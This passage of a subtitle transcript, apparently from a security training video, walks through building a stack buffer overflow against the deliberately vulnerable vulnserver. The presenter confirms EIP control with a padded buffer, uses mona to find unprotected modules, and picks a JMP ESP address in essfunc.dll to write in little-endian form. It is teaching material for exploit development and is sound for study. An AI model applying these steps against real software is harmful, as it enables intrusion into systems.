code.\n\n258\n00:12:22.031 --> 00:12:26.300\nAll right, now that that's happening,\nlet me kill this again.\n\n259\n00:12:27.855 --> 00:12:29.823\nAnd restart it.\n\n260\n00:12:29.823 --> 00:12:35.461\nLike I said, a lot of repetitive action\ngoing on with this exploit per-se.\n\n261\n00:12:35.461 --> 00:12:36.945\nRestart immunity.\n\n262\n00:12:36.945 --> 00:12:39.450\nRun as administrator.\n\n263\n00:12:39.450 --> 00:12:40.711\nAttach the file.\n\n264\n00:12:40.711 --> 00:12:42.070\nSee here, attach.\n\n265\n00:12:44.280 --> 00:12:46.155\nAnd vault server, attach.\n\n266\n00:12:46.155 --> 00:12:49.450\nAnd hit play, so it will start.\n\n267\n00:12:49.450 --> 00:12:50.047\nOkay, perfect.\n\n268\n00:12:50.047 --> 00:12:56.540\nNow, we are set up to the third phase\nof our fuzzing, almost to the exploit.\n\n269\n00:12:56.540 --> 00:12:58.319\nWe are so close, it's painful.\n\n270\n00:12:58.319 --> 00:12:59.230\nIt's awesome, right?\n\n271\n00:12:59.230 --> 00:13:03.459\nSo LS, you'll notice I have this\nscript right here, 3fuzz.py.\n\n272\n00:13:03.459 --> 00:13:05.000\nI know, I'm so creative.\n\n273\n00:13:05.000 --> 00:13:07.595\n[LAUGH] I'll nano that one,\nclear the screen, actually.\n\n274\n00:13:07.595 --> 00:13:11.930\nNano 3fuzz.py.\n\n275\n00:13:11.930 --> 00:13:13.961\nAgain, the code is the same.\n\n276\n00:13:13.961 --> 00:13:17.010\nThere's a little difference.\n\n277\n00:13:17.010 --> 00:13:19.585\nYou'll notice we keep navigating and\n\n278\n00:13:19.585 --> 00:13:23.614\nhovering around a certain area\nwhich is right around here.\n\n279\n00:13:23.614 --> 00:13:28.910\nNow, I've created a few new variables.\n\n280\n00:13:28.910 --> 00:13:30.669\nThis is where our code is\nchanging a little bit.\n\n281\n00:13:30.669 --> 00:13:34.130\nSo, it's starting to morph into more\nof an exploit than it is a fuzz.\n\n282\n00:13:34.130 --> 00:13:35.146\nBut this is still a fuzz.\n\n283\n00:13:35.146 --> 00:13:39.670\nBecause now we have an attack,\nwe knew that A will start.\n\n284\n00:13:39.670 --> 00:13:43.591\nBecause I need to start filling\nthe bucket up, so that it will overflow.\n\n285\n00:13:43.591 --> 00:13:46.990\nAnd I know that that happens\nright after byte 2003.\n\n286\n00:13:46.990 --> 00:13:51.776\nSo I'm gonna send 2003 As cuz that-\n&gt;&gt; That\n\n287\n00:13:51.776 --> 00:13:53.580\nshould get you right to\nthe beginning of the EIP.\n\n288\n00:13:53.580 --> 00:13:56.112\n&gt;&gt; Exactly,\nthat's gonna point me right to the EIP.\n\n289\n00:13:56.112 --> 00:13:59.630\nAnd now I wanna make sure\nthat that's the exact spot.\n\n290\n00:13:59.630 --> 00:14:04.115\nYou wanna trust but verify, like old\nRonald Regan used to say it all the time,\n\n291\n00:14:04.115 --> 00:14:05.219\ntrust but verify.\n\n292\n00:14:05.219 --> 00:14:07.650\nSo, we wanna verify that\nwe have the right spot.\n\n293\n00:14:07.650 --> 00:14:09.123\nWe may have to do some shucking and\njiving.\n\n294\n00:14:09.123 --> 00:14:11.482\nMaybe there was,\nwe didn't type something correctly,\n\n295\n00:14:11.482 --> 00:14:13.900\nwe just wannna make sure we're\ngetting in the right zone.\n\n296\n00:14:15.210 --> 00:14:18.161\nSo what I did was, I just created\na variable called EIP right here.\n\n297\n00:14:18.161 --> 00:14:21.590\nI'm gonna make sure you guys\nare seeing that really well.\n\n298\n00:14:21.590 --> 00:14:22.276\nThere we go.\n\n299\n00:14:22.276 --> 00:14:27.212\nJump that up, eip=b,\njust sending four b's.\n\n300\n00:14:27.212 --> 00:14:33.219\nIf I see four b's in my EIP when we send\nthis fuzz, I should be golden, right?\n\n301\n00:14:33.219 --> 00:14:34.310\nI should be gravy.\n\n302\n00:14:34.310 --> 00:14:36.892\nAnd the for the rest of it,\nI'll just send Cs.\n\n303\n00:14:36.892 --> 00:14:40.538\nThat way, if I see Cs in my EIP,\nor if I see As in my EIP,\n\n304\n00:14:40.538 --> 00:14:44.510\nI know that I'm not quite\nin the right zone, right?\n\n305\n00:14:44.510 --> 00:14:45.806\nAnd it helps me out with that.\n\n306\n00:14:45.806 --> 00:14:50.850\nSo that's why I just said, I'll make\na pad of data and I'll make them all Cs.\n\n307\n00:14:50.850 --> 00:14:53.578\nThat way it's different than the As and\nit's different.\n\n308\n00:14:53.578 --> 00:14:55.330\nSo I can get that idea.\n\n309\n00:14:55.330 --> 00:14:56.024\nThat's a good thing.\n\n310\n00:14:56.024 --> 00:15:00.030\nAnd then I just created a buffer, I'm\nbasically adding those things together.\n\n311\n00:15:00.030 --> 00:15:04.879\nAnother variable called buffer, and\nsaying buffer = attack + eip + pad,\n\n312\n00:15:04.879 --> 00:15:05.880\nin that order.\n\n313\n00:15:05.880 --> 00:15:09.170\nAnd then I send that buffer.\n\n314\n00:15:09.170 --> 00:15:10.043\nEasily done, right?\n\n315\n00:15:10.043 --> 00:15:13.670\nYou guys are following me, I know you\nare cuz you're smart people, I can tell.\n\n316\n00:15:13.670 --> 00:15:14.471\nI can sense it.\n\n317\n00:15:14.471 --> 00:15:17.960\nThat's why you're here,\nlistening to what I have to say right now.\n\n318\n00:15:17.960 --> 00:15:19.123\nAll right, let's do that.\n\n319\n00:15:19.123 --> 00:15:20.080\nI've got everything running?\n\n320\n00:15:20.080 --> 00:15:22.309\nYep, our guys running.\n\n321\n00:15:22.309 --> 00:15:24.716\nOkay, and Ctrl+X out of here.\n\n322\n00:15:24.716 --> 00:15:27.839\nAnd let's run that 3fuzz.py.\n\n323\n00:15:27.839 --> 00:15:32.134\nLength of attack like I said, I could\nremove that portion of it at this point\n\n324\n00:15:32.134 --> 00:15:35.218\nbecause we're sending a defined length,\na string.\n\n325\n00:15:35.218 --> 00:15:37.873\nSo, that's really\nsuperfluous at this point.\n\n326\n00:15:37.873 --> 00:15:40.515\nYou can just comment that code\nout if you wanted to, but\n\n327\n00:15:40.515 --> 00:15:42.245\nit doesn't bother anything here.\n\n328\n00:15:42.245 --> 00:15:42.894\nSo, here we go.\n\n329\n00:15:42.894 --> 00:15:43.969\nHit Enter.\n\n330\n00:15:43.969 --> 00:15:45.449\nSends the data.\n\n331\n00:15:45.449 --> 00:15:46.880\nAnd look over here.\n\n332\n00:15:46.880 --> 00:15:48.963\nHere's our EIP.\n\n333\n00:15:48.963 --> 00:15:54.080\nLook at that 424242,\nthat's what we want to see.\n\n334\n00:15:54.080 --> 00:15:55.984\nThat's a good thing.\n\n335\n00:15:55.984 --> 00:16:00.287\nAnd also, ESP, what's it showing me?\n\n336\n00:16:00.287 --> 00:16:01.688\nA bunch of C's.\n\n337\n00:16:01.688 --> 00:16:05.978\nSo I see no C's,\nI don't see any 43s in my EIP.\n\n338\n00:16:05.978 --> 00:16:10.967\nAnd I don't see any 41's on my EIP,\nthat means that a right here\n\n339\n00:16:10.967 --> 00:16:15.503\nover 40 EAS the overflow to\nthe EIP just at the right spur,\n\n340\n00:16:15.503 --> 00:16:20.050\nthat's why they are showing\nour bits are 42's.\n\n341\n00:16:20.050 --> 00:16:27.590\nAnd an ESP register was also written\ninto our pad, which was just all seems.\n\n342\n00:16:27.590 --> 00:16:33.300\nWe are primed and ready to create\nthe final phase of the exploit code.\n\n343\n00:16:33.300 --> 00:16:38.290\nBut it's not just as simple as jumping in\nthere and going hey, do this or do that.\n\n344\n00:16:38.290 --> 00:16:42.120\nWe have to figure out how to make it\nnow that we know where those spots lie,\n\n345\n00:16:42.120 --> 00:16:43.970\nwhere is that stuff?\n\n346\n00:16:43.970 --> 00:16:47.342\nNow we need to give it instructions\nthere instead of just random data.\n\n347\n00:16:47.342 --> 00:16:50.570\nI hope you're following that.\n\n348\n00:16:50.570 --> 00:16:53.980\nWe need to use some of\nthese things over here.\n\n349\n00:16:53.980 --> 00:16:54.700\nLet me zoom out.\n\n350\n00:16:55.730 --> 00:16:56.810\nOf course, it's not showing it.\n\n351\n00:16:56.810 --> 00:16:58.080\nI hate when it does that.\n\n352\n00:16:58.080 --> 00:16:59.400\nBut then let me follow this.\n\n353\n00:16:59.400 --> 00:17:00.510\nMaybe it will show some things.\n\n354\n00:17:02.080 --> 00:17:04.250\nESP I mean, ESP.\n\n355\n00:17:04.250 --> 00:17:04.890\nFollow that and dump.\n\n356\n00:17:06.190 --> 00:17:07.880\nNow it's not giving me any CPU registers.\n\n357\n00:17:07.880 --> 00:17:10.230\nBut remember,\nwe see all this stuff over here.\n\n358\n00:17:10.230 --> 00:17:11.750\nIt has a list of commands.\n\n359\n00:17:11.750 --> 00:17:13.900\nLet's just get that open.\n\n360\n00:17:13.900 --> 00:17:15.040\nIt's crashed anyway, so.\n\n361\n00:17:15.040 --> 00:17:16.020\nWe have to restart it.\n\n362\n00:17:16.020 --> 00:17:19.845\nAnd start immunity.\n\n363\n00:17:19.845 --> 00:17:21.566\nThis administrator.\n\n364\n00:17:21.566 --> 00:17:23.850\nReattach our file.\n\n365\n00:17:23.850 --> 00:17:26.035\nI know, it's a painful process.\n\n366\n00:17:26.035 --> 00:17:28.370\n&gt;&gt; [LAUGH] So really Daniel,\nwhile you're getting that done,\n\n367\n00:17:28.370 --> 00:17:32.420\nI mean, what we've done so far is nothing,\nwell I say nothing more than,\n\n368\n00:17:32.420 --> 00:17:35.350\nit was a big task getting\ndone what we've got done.\n\n369\n00:17:35.350 --> 00:17:38.740\nBut what we've really been doing\nis mapping out the registers\n\n370\n00:17:38.740 --> 00:17:39.900\nthat this program is using.\n\n371\n00:17:39.900 --> 00:17:43.863\nWe're trying to locate everything,\nnothing that we've done is an exploit or\n\n372\n00:17:43.863 --> 00:17:44.893\nattack of any kind.\n\n373\n00:17:44.893 --> 00:17:47.840\nWe're just trying to map everything out.\n\n374\n00:17:47.840 --> 00:17:50.150\nNow we can start planning\nthe actual attack.\n\n375\n00:17:50.150 --> 00:17:50.900\n&gt;&gt; That's right.\n\n376\n00:17:50.900 --> 00:17:54.065\nI mean technically,\nwe denial of serviced it.\n\n377\n00:17:54.065 --> 00:17:55.350\n&gt;&gt; Yes.\n&gt;&gt; Because we've crashed the program.\n\n378\n00:17:55.350 --> 00:17:57.890\nYou can call it that,\nif you wanted to call that a day and\n\n379\n00:17:57.890 --> 00:17:59.480\nsay, I can crash a program.\n\n380\n00:17:59.480 --> 00:18:01.140\nWell, then great, you're off to the races.\n\n381\n00:18:01.140 --> 00:18:02.920\nBut right, I like how Mike put that.\n\n382\n00:18:02.920 --> 00:18:03.900\nWe're mapping it out.\n\n383\n00:18:03.900 --> 00:18:06.190\nWe're mapping out where\nthose registers are.\n\n384\n00:18:06.190 --> 00:18:07.990\nHow many bytes did they hold?\n\n385\n00:18:07.990 --> 00:18:11.200\nAnd how can we overflow them so\nthat we can control them?\n\n386\n00:18:11.200 --> 00:18:12.400\nThat's what we've been doing.\n\n387\n00:18:12.400 --> 00:18:15.900\nAnd now if you look at the screen,\nI got the CPU data backup over here.\n\n388\n00:18:15.900 --> 00:18:18.680\nThese are all, remember, we talked about\nit before, these are all instructions.\n\n389\n00:18:18.680 --> 00:18:22.090\nI need to find a specific\nset of instructions so\n\n390\n00:18:22.090 --> 00:18:23.860\nthat I can make it do those instructions.\n\n391\n00:18:23.860 --> 00:18:27.600\nI wanna put those instructions\nin my exploit code so\n\n392\n00:18:27.600 --> 00:18:31.410\nthat when it overwrites EIP, it's\ninstructions instead of a bunch of b's.\n\n393\n00:18:31.410 --> 00:18:34.520\nAll right, so, let's,\nI'll hit play on that.\n\n394\n00:18:35.910 --> 00:18:36.990\nLet's see, where are we at?\n\n395\n00:18:36.990 --> 00:18:42.370\nWe need to make the EIP instructions\na specific instructions,\n\n396\n00:18:42.370 --> 00:18:43.350\nbecause we want to go.\n\n397\n00:18:43.350 --> 00:18:47.660\nRemember, we overflowed in that ESP area,\nthat's where all our c's ended up.\n\n398\n00:18:47.660 --> 00:18:50.110\nThat's where I wanna put my exploit code.\n\n399\n00:18:50.110 --> 00:18:53.700\nBut I also need to, I can't just\nput my exploit code there, and\n\n400\n00:18:53.700 --> 00:18:56.930\nthis program go hey,\nI found some exploit code, let's run it.\n\n401\n00:18:56.930 --> 00:18:58.640\nI need to tell it to run it.\n\n402\n00:18:58.640 --> 00:19:02.240\nSo we're gonna use the EIP because it\nis the instruction pointer, right.\n\n403\n00:19:02.240 --> 00:19:04.220\nBasically says, do this.\n\n404\n00:19:04.220 --> 00:19:05.200\nHere's the next thing you should do.\n\n405\n00:19:05.200 --> 00:19:07.260\nHere's the next thing you should do.\n\n406\n00:19:07.260 --> 00:19:08.240\nI wanna tell it,\n\n407\n00:19:08.240 --> 00:19:12.395\nthe next thing you should do is look in\nESP and execute whatever you find there.\n\n408\n00:19:12.395 --> 00:19:13.070\n&gt;&gt; [LAUGH]\n&gt;&gt; That's what we wanna do.\n\n409\n00:19:13.070 --> 00:19:15.302\nSo we need to find jmp esp,\n\n410\n00:19:15.302 --> 00:19:20.600\nj-m-p e-s-p that's a set of commands\nIn assembly so that it will do that.\n\n411\n00:19:20.600 --> 00:19:24.222\nI want to jump to the ESP register so\nthat it will execute whatever it finds,\n\n412\n00:19:24.222 --> 00:19:26.246\nwhich will eventually be our shell code.\n\n413\n00:19:26.246 --> 00:19:28.820\nSo how do we do that?\n\n414\n00:19:28.820 --> 00:19:33.360\nWe need to install some modules\ninto immunity right here.\n\n415\n00:19:33.360 --> 00:19:37.190\nLet me show you how to do that,\ncuz it doesn't come pre-installed.\n\n416\n00:19:37.190 --> 00:19:41.230\nIf you go out to the interwebs,\nwhere's my browser here.\n\n417\n00:19:41.230 --> 00:19:45.293\nAnd you go to, let's see here, what is it?\n\n418\n00:19:45.293 --> 00:19:48.671\nIt is GitHub,\n\n419\n00:19:48.671 --> 00:19:58.805\nhttps:\\\\github.com\\corlan\\mona\n\n420\n00:19:58.805 --> 00:20:02.140\nlike that.\n\n421\n00:20:02.140 --> 00:20:04.600\nThat's where you wanna go,\nthis is what we wanna grab.\n\n422\n00:20:04.600 --> 00:20:08.660\nThese are modules, Python modules,\nfor the immunity debugger.\n\n423\n00:20:08.660 --> 00:20:09.870\nAnd they make our lives so much easier,\n\n424\n00:20:09.870 --> 00:20:11.674\nthey help us do these very\nthings that we're trying to do.\n\n425\n00:20:11.674 --> 00:20:15.830\nYou'll notice there is a mona.py,\na nice readme, a license.\n\n426\n00:20:17.010 --> 00:20:21.380\nReally all you need is the mona.py,\nthat's what we wanna grab.\n\n427\n00:20:21.380 --> 00:20:24.610\nAnd it even tells you right here,\nit's very simple to install this.\n\n428\n00:20:24.610 --> 00:20:28.160\nSimply drop mona.py into\nthe PyCommands folder\n\n429\n00:20:28.160 --> 00:20:32.740\ninside the Immunity Debugger folder\nsection, very, very easy, right?\n\n430\n00:20:32.740 --> 00:20:35.960\nSo what you can do is just hit that,\ndownload that, copy that,\n\n431\n00:20:35.960 --> 00:20:36.620\nwhatever you wanna do.\n\n432\n00:20:36.620 --> 00:20:38.140\nGet it to your machine.\n\n433\n00:20:38.140 --> 00:20:40.180\nAnd then, which I did here already.\n\n434\n00:20:40.180 --> 00:20:41.010\nBut I'll show you what to do.\n\n435\n00:20:41.010 --> 00:20:42.710\nLet me shrink this down.\n\n436\n00:20:43.982 --> 00:20:48.651\nIt's like open your file serve,\nlet me have another one.\n\n437\n00:20:48.651 --> 00:20:55.100\nWindows Explorer, go to computer,\nC, program files.\n\n438\n00:20:55.100 --> 00:20:56.240\nThere's Immunity Inc.\n\n439\n00:20:57.730 --> 00:20:58.720\nImmunity Debugger.\n\n440\n00:20:59.740 --> 00:21:01.350\nThen there is the,\nI think it's PyCommands.\n\n441\n00:21:02.650 --> 00:21:03.740\n&gt;&gt; PyCommands.\n&gt;&gt; That's it.\n\n442\n00:21:03.740 --> 00:21:05.170\nPyCommands.\n\n443\n00:21:05.170 --> 00:21:06.870\nAnd then you just drop that right here.\n\n444\n00:21:06.870 --> 00:21:10.770\nYou just copy and paste it into this\nfolder and now you have the Python or\n\n445\n00:21:10.770 --> 00:21:13.020\nthe mona modules working.\n\n446\n00:21:13.020 --> 00:21:16.300\nYou'll have, I think you have to\nrestart Immunity once you're done\n\n447\n00:21:16.300 --> 00:21:17.250\nMaybe you do, I don't know.\n\n448\n00:21:17.250 --> 00:21:18.762\nIf it doesn't work restart it.\n\n449\n00:21:18.762 --> 00:21:20.900\n&gt;&gt; [LAUGH]\n&gt;&gt; If it does great, to the races.\n\n450\n00:21:20.900 --> 00:21:22.540\nAnd there you go.\n\n451\n00:21:22.540 --> 00:21:25.080\nAnd you now have Mona modules.\n\n452\n00:21:25.080 --> 00:21:26.260\nVery simple, very straightforward.\n\n453\n00:21:26.260 --> 00:21:26.970\nThat's what I loved about it.\n\n454\n00:21:26.970 --> 00:21:31.980\nAnd now we're going to use those Mona\nmodules to find that jump command.\n\n455\n00:21:31.980 --> 00:21:35.500\nWhere's a good place that we can\nsteal from to make that happen?\n\n456\n00:21:35.500 --> 00:21:37.280\nThat's what we're gonna do.\n\n457\n00:21:37.280 --> 00:21:40.340\nI can't just say,\nhere's the jump command, jump ESP.\n\n458\n00:21:40.340 --> 00:21:45.700\nThere actually has to be an instruction\nsomewhere that says jumped the ESP.\n\n459\n00:21:45.700 --> 00:21:48.550\nHopefully we can find that, and use that.\n\n460\n00:21:48.550 --> 00:21:53.240\nI just need that four byte piece\nof data of where that might be, so\n\n461\n00:21:53.240 --> 00:21:54.210\nthat we can make that happen.\n\n462\n00:21:55.530 --> 00:21:57.490\nSo let's open up immunity here.\n\n463\n00:21:57.490 --> 00:22:01.090\nThis is where it gets super hinky and\nsuper hard to follow.\n\n464\n00:22:01.090 --> 00:22:04.470\nI myself get twisted around\nhere a lot doing this.\n\n465\n00:22:04.470 --> 00:22:08.010\nSo forgive me if I'm acting strange.\n\n466\n00:22:08.010 --> 00:22:08.910\n&gt;&gt; We'll cut you a little slack.\n\n467\n00:22:08.910 --> 00:22:10.100\n&gt;&gt; Yeah, cut me just a hair of slack.\n\n468\n00:22:10.100 --> 00:22:13.180\nSo I'm definitely gonna follow my\nnotes to the t here cuz it's super\n\n469\n00:22:13.180 --> 00:22:13.920\neasy to get lost.\n\n470\n00:22:14.970 --> 00:22:15.870\nSo we've put in mono.\n\n471\n00:22:15.870 --> 00:22:19.640\nWe need to run the Mona\nmodules down here in immunity.\n\n472\n00:22:19.640 --> 00:22:22.125\nYou have an actual like command\nline area which is cool.\n\n473\n00:22:22.125 --> 00:22:28.930\nAnd we do exclamation point Mona and\nwe wanna look at modules.\n\n474\n00:22:28.930 --> 00:22:30.795\nAll the modules that have been\nloaded up by the bone server.\n\n475\n00:22:30.795 --> 00:22:33.578\nSo mona modules hit return.\n\n476\n00:22:33.578 --> 00:22:38.220\nNow we get a new screen,\nactually a couple new screens.\n\n477\n00:22:38.220 --> 00:22:41.380\nLooking cool,\ngot a lot of stuff going on here.\n\n478\n00:22:41.380 --> 00:22:45.290\nHopefully that's big enough, I think\nit's good enough on the screen there.\n\n479\n00:22:45.290 --> 00:22:47.640\nIf not you guys can pipe in and\nlet me know.\n\n480\n00:22:47.640 --> 00:22:50.254\n&gt;&gt; Can you bump it over a hair to\nthe right the beginning of your command is\n\n481\n00:22:50.254 --> 00:22:51.555\ngetting chopped just a hair.\n\n482\n00:22:51.555 --> 00:22:54.120\n&gt;&gt; Sure.\nLet me make sure I can see what you\n\n483\n00:22:54.120 --> 00:22:55.019\ntyped in.\n\n484\n00:22:55.019 --> 00:22:56.917\nNo, that won't work, that's okay.\n\n485\n00:22:56.917 --> 00:22:57.500\n&gt;&gt; I gotcha.\n\n486\n00:22:57.500 --> 00:22:59.000\n&gt;&gt; There's an exclamation\npoint in front of it.\n\n487\n00:22:59.000 --> 00:23:01.600\n&gt;&gt; There is an exclamation\npoint then mona then modules.\n\n488\n00:23:01.600 --> 00:23:03.620\nI think it's just our bevel.\n\n489\n00:23:03.620 --> 00:23:05.460\n&gt;&gt; Yep.\n&gt;&gt; Cutting it off.\n\n490\n00:23:05.460 --> 00:23:06.820\nAll right, so what's going on here?\n\n491\n00:23:06.820 --> 00:23:10.560\nIt's showing all the modules that\nhave been loaded by bone server.\n\n492\n00:23:10.560 --> 00:23:13.610\nAnd where they reside in memory.\n\n493\n00:23:13.610 --> 00:23:17.120\nWhat's interesting is this\nalso tells us whether or not,\n\n494\n00:23:17.120 --> 00:23:18.980\nremember when we talked about ASLR?\n\n495\n00:23:18.980 --> 00:23:23.310\nBack in the day whether or\nnot it has protections on it?\n\n496\n00:23:23.310 --> 00:23:24.860\nThat is gonna be right here.\n\n497\n00:23:24.860 --> 00:23:29.820\nBasically, what we want in this region is\nfor these to say false cuz it's telling me\n\n498\n00:23:29.820 --> 00:23:35.000\nwhether or not the rebase,\nthe SAFESEH, ASLR,\n\n499\n00:23:35.000 --> 00:23:39.800\nNXCOMPAT, OSD11, all this other stuff,\nis that true or is that false?\n\n500\n00:23:39.800 --> 00:23:41.050\nIs it on or is it off?\n\n501\n00:23:41.050 --> 00:23:42.420\nIf says false, it's off.\n\n502\n00:23:42.420 --> 00:23:43.950\nThere's no protection there.\n\n503\n00:23:43.950 --> 00:23:46.480\nSo that's what we want,\nwe want no protection.\n\n504\n00:23:46.480 --> 00:23:49.580\nThat just allows us to kind of dip our toe\ninto there and go, thank you very much,\n\n505\n00:23:49.580 --> 00:23:50.200\nlet me use that.\n\n506\n00:23:50.200 --> 00:23:53.810\nWe have two of those possibilities.\n\n507\n00:23:53.810 --> 00:23:57.110\nOne's right here which is\nthis ESS function.dll and\n\n508\n00:23:57.110 --> 00:23:59.682\nthe other is actual vault server itself.\n\n509\n00:23:59.682 --> 00:24:01.692\nSo you could use one of the other.\n\n510\n00:24:01.692 --> 00:24:04.221\nI'm just gonna go with the first\none that they give us and see and\n\n511\n00:24:04.221 --> 00:24:05.231\nrun it off the flag pole.\n\n512\n00:24:05.231 --> 00:24:06.535\nSee if that salutes.\n\n513\n00:24:06.535 --> 00:24:11.893\nSo I know that the ESS func.dll\nhas no protections on and\n\n514\n00:24:11.893 --> 00:24:14.973\nso that's a good module to use.\n\n515\n00:24:14.973 --> 00:24:19.680\nSo the next thing I need to know is\nI need to find the instructions at.\n\n516\n00:24:19.680 --> 00:24:25.510\nWhere is the instruction that\nI need that JMP ESP reside,\n\n517\n00:24:25.510 --> 00:24:27.820\nwhere does it happen,\nthat's the one we need to find.\n\n518\n00:24:27.820 --> 00:24:33.420\nCool thing is we've got another neat\nlittle Ruby script or an interface even.\n\n519\n00:24:33.420 --> 00:24:34.700\nIt becomes like a little shell.\n\n520\n00:24:34.700 --> 00:24:37.713\nIt's called the NASM shell, N-A-S-M,\n\n521\n00:24:37.713 --> 00:24:43.900\nwhich will show us what hex value we need\nto look for to find that very thing.\n\n522\n00:24:43.900 --> 00:24:49.202\nSo I'm gonna jump back over\nhere to my Kali Linux,\n\n523\n00:24:49.202 --> 00:24:55.786\nI'm going to locate nsan_,\nwhat is it, shell is it, .rb.\n\n524\n00:24:55.786 --> 00:24:57.330\nYeah, there we go.\n\n525\n00:24:59.150 --> 00:25:01.348\nDo my old cut and copy and paste.\n\n526\n00:25:04.611 --> 00:25:09.059\nPaste that in there and then hit Enter.\n\n527\n00:25:09.059 --> 00:25:11.450\nIt should give me a prompt.\n\n528\n00:25:11.450 --> 00:25:12.370\nYes, there we go.\n\n529\n00:25:12.370 --> 00:25:14.240\nSo now I'm inside the NASM thing.\n\n530\n00:25:14.240 --> 00:25:18.549\nAnd I just want it to tell me, what is\nthe hex equivalent of a JMP ESP command.\n\n531\n00:25:18.549 --> 00:25:19.550\nThat's what I need to know.\n\n532\n00:25:19.550 --> 00:25:22.460\nSo just type it in jmp esp.\n\n533\n00:25:22.460 --> 00:25:28.190\nHit return and there we go,\nthere's my two-byte hex value for jmp esp.\n\n534\n00:25:28.190 --> 00:25:33.330\nSo now I know what to look for\ninside of that module to\n\n535\n00:25:33.330 --> 00:25:36.650\nsend it to where I want it to go,\nso we can hit that ESP register.\n\n536\n00:25:36.650 --> 00:25:39.720\nI can exit out of that folder,\nthere we go.\n\n537\n00:25:39.720 --> 00:25:43.080\nI need FFE4, so\nthat's what I'm gonna look for.\n\n538\n00:25:43.080 --> 00:25:47.520\nAnd you do have to structure is a certain\nway in true hex format, but whatevs.\n\n539\n00:25:47.520 --> 00:25:50.350\nSo now we can run back, close this.\n\n540\n00:25:51.960 --> 00:25:55.660\nInside of mona modules we'll search,\nit's mona, it's not mona modules.\n\n541\n00:25:55.660 --> 00:25:57.000\nI keep saying that.\n\n542\n00:25:57.000 --> 00:26:00.340\nWe look for modules using mona,\nnow we're gonna search using mona.\n\n543\n00:26:00.340 --> 00:26:05.140\nInside of a module for\nthat jump esp FFE4 value, right.\n\n544\n00:26:06.420 --> 00:26:13.248\nSo I'm gonna do Amona then we'll say find,\n-s like so,\n\n545\n00:26:13.248 --> 00:26:18.385\nthe quotations around this /xff/xe4.\n\n546\n00:26:18.385 --> 00:26:24.177\nThen close it after quotations and\nthen -m for\n\n547\n00:26:24.177 --> 00:26:30.580\nthe module which was essfunc.tll and\nhit return.\n\n548\n00:26:30.580 --> 00:26:35.010\nAll right, so\nsays it found a total of nine pointers.\n\n549\n00:26:35.010 --> 00:26:40.150\nOf nine possible results that could\ngive us what we're looking for.\n\n550\n00:26:40.150 --> 00:26:45.110\nAgain, I like to start with the top\none and just double-click it.\n\n551\n00:26:45.110 --> 00:26:47.700\nAnd you'll notice that if I\ndouble-click it, it takes me to return.\n\n552\n00:26:47.700 --> 00:26:50.867\nThat's not what I'm looking for,\nI'm looking for jmp esp.\n\n553\n00:26:50.867 --> 00:26:54.549\nThat is not it, so let's close that one.\n\n554\n00:26:54.549 --> 00:26:56.504\nIf I can get this over help,\nplease, thank you.\n\n555\n00:26:56.504 --> 00:26:57.297\nBe gone.\n\n556\n00:26:57.297 --> 00:27:00.940\nLet's try this one.\n\n557\n00:27:00.940 --> 00:27:02.180\nJmp esp.\n\n558\n00:27:02.180 --> 00:27:03.390\nThat is a good value.\n\n559\n00:27:03.390 --> 00:27:04.870\nThat's what I'm looking for.\n\n560\n00:27:04.870 --> 00:27:09.040\nThere is the memory,\nthe hex memory value right there.\n\n561\n00:27:09.040 --> 00:27:10.040\nGonna get out my little pen.\n\n562\n00:27:10.040 --> 00:27:11.345\nI'm actually gonna do that right now.\n\n563\n00:27:11.345 --> 00:27:17.543\n[LAUGH] And I'm gonna say 625011BB.\n\n564\n00:27:17.543 --> 00:27:24.610\nThat should give us a correct jump\nbecause it is FFE4 which is jmp esp.\n\n565\n00:27:24.610 --> 00:27:28.680\nThat's what we're looking for and\nif everything goes according to plan.\n\n566\n00:27:28.680 --> 00:27:31.144\nThen that's a big if, right.\n\n567\n00:27:31.144 --> 00:27:32.084\n[LAUGH] I love this stuff.\n\n568\n00:27:32.084 --> 00:27:34.110\n&gt;&gt; [LAUGH]\n&gt;&gt; It's one big question mark usually.\n\n569\n00:27:34.110 --> 00:27:38.180\nWe should be able to get\nalong just fine with that.\n\n570\n00:27:38.180 --> 00:27:42.790\nSo let me close this and\nstill running, getting out of there.\n\n571\n00:27:42.790 --> 00:27:46.320\nSpring up my views,\nCP is looking good our normal view backup.\n\n572\n00:27:48.340 --> 00:27:54.278\nAnd let's move back over to our fuzzer.\n\n573\n00:27:54.278 --> 00:27:57.720\nSo we're going to replace three fuzz.\n\n574\n00:27:57.720 --> 00:28:00.200\nWe're going to do a nano three fuzz.\n\n575\n00:28:00.200 --> 00:28:05.030\nWe're going to do a little chopping and\ndicing here on our scripts.\n\n576\n00:28:05.030 --> 00:28:06.100\nI'm gonna replace that.\n\n577\n00:28:10.520 --> 00:28:16.110\nTake all this out and\nmake it that actual format.\n\n578\n00:28:16.110 --> 00:28:17.825\nThis is where we talked\nabout little Endian.\n\n579\n00:28:17.825 --> 00:28:19.200\n&gt;&gt; Mm-hm.\n\n580\n00:28:19.200 --> 00:28:23.600\n&gt;&gt; Funny little business,\nlittle Endian, little E-n-d-i-a-n or\n\n581\n00:28:23.600 --> 00:28:24.910\nI think that's how it's spelled.\n\n582\n00:28:24.910 --> 00:28:28.456\nLittle Endian which means take that value,\n[SOUND], flip it around.\n\n583\n00:28:28.456 --> 00:28:29.470\n&gt;&gt; Okay.\n\n584\n00:28:29.470 --> 00:28:31.065\n&gt;&gt; If you don't flip it around,\nit does not work.\n\n585\n00:28:31.065 --> 00:28:32.450\n&gt;&gt; [LAUGH]\n&gt;&gt; So\n\n586\n00:28:32.450 --> 00:28:36.480\nwhen you go to type in your EAP values\ninto your scripts, you must use what's\n\n587\n00:28:36.480 --> 00:28:42.070\ncalled little Endian formats, which is\nwhatever you saw and when you look at it.\n\n588\n00:28:42.070 --> 00:28:46.570\nReverse that process and put it in that\nway, so it's a very important thing.\n\n589\n00:28:46.570 --> 00:28:50.279\nAnd we need to do that\nin a specific fashion,\n\n590\n00:28:50.279 --> 00:28:54.607\nwhich is going to be with\na little bit of like this x.\n\n591\n00:28:54.607 --> 00:29:01.080\nLet's see, it will be bb/x then\nit was 1 1/x which was 5 0 and\n\n592\n00:29:01.080 --> 00:29:08.760\nthen slash x, I think I'm doing\nthe slashes correctly, I'm pretty sure.\n\n593\n00:29:08.760 --> 00:29:13.490\nAnd then 6 2,\nput my quotations around that and\n\n594\n00:29:13.490 --> 00:29:18.470\nnow we should see that\nvalue inside of our EIP.\n\n595\n00:29:18.470 --> 00:29:19.800\nWe should see, right?\n\n596\n00:29:19.800 --> 00:29:23.950\nSo let's save and control [INAUDIBLE]\nx and\n\n597\n00:29:23.950 --> 00:29:26.300\neverything is running,\neverything is running.\n\n598\n00:29:26.300 --> 